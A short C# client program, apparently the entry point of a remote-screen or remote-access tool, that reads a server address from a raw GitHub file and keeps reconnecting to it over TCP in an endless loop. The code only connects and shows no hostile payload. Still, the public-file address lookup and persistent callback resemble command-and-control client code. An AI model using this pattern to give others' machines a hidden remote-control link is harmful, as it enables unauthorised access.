using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Secren_Client
{
    class Program
    {
        static void Main(string[] args)
        {
            reconnect:
            try
            {
                string address_key = "https://raw.githubusercontent.com/pag6666/ip_host_port_git/main/host.txt";
                string _host = "";
                int _port = 0;
                using (WebClient web = new WebClient())
                {
                   string[] array = web.DownloadString(address_key).Split(':');
                    _host = array[0];
                    _port = int.Parse(array[1]);
                   
                }
                    ClientObject client = new ClientObject((object)new TcpClient(_host, _port));
                client.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: "+ex.Message);
                
            }
            goto reconnect;
        }
    }
}
